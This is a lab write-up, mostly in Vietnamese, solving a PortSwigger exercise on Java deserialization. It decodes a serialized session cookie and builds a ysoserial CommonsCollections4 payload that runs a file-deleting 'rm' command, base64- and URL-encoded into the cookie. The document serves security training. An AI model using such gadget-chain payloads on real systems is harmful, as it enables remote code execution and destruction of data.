
# Target Goal: 

This lab uses a serialization-based session mechanism and loads the Apache Commons Collections library. Although you don't have source code access, you can still exploit this lab using pre-built gadget chains.

To solve the lab, use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the `morale.txt` file from Carlos's home directory.

# Recon: 

Sau khi login, ta sẽ có session được cấp: 

![image](https://github.com/vanniichan/Portswigger/assets/112863484/97c9aa2d-8baa-446c-9705-cd9fa67a36c1)

Thử đem đi dcode sang b64 ta nhận thấy đây là java serialize:

![image](https://github.com/vanniichan/Portswigger/assets/112863484/b688681f-a34f-4d5d-b693-0a4b9e81e4e5)

Chúng ta cần sử dụng tool của bên thứ 3 .Và công cụ phổ biến để exploit Apache Common là `ysoserial`. `ysoserial` là 1 tool thường được dùng đẻ khai thác lỗ hổng liên quan đến Java deserialization tạo ra các object thông qua gadget chain ứng với thư viện có sẵn.
```
java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w 0 > cookie.txt

// Chỉ gói 4 mới hoạt độngh đúng gói của nó sâu khi sử dụng các gói khác
// -w 0 đảm bảo rằng chuỗi base64 được xuất ra trên một dòng duy nhất, không có ngắt dòng
```

Thay value apply lại web, và nó xuất hiện lỗi này:

![image](https://github.com/vanniichan/Portswigger/assets/112863484/3988bea9-137e-4140-87cf-c66e78df27a9)

Lý do là vì có các byte chưa được xử lí đúng và encode URL:

![image](https://github.com/vanniichan/Portswigger/assets/112863484/c3ea67f8-7ca4-4fa6-8bbf-209fd74aff58)

# Flag: 

![image](https://github.com/vanniichan/Portswigger/assets/112863484/72d569ee-83b6-45be-9792-ebaa5c28e23a)
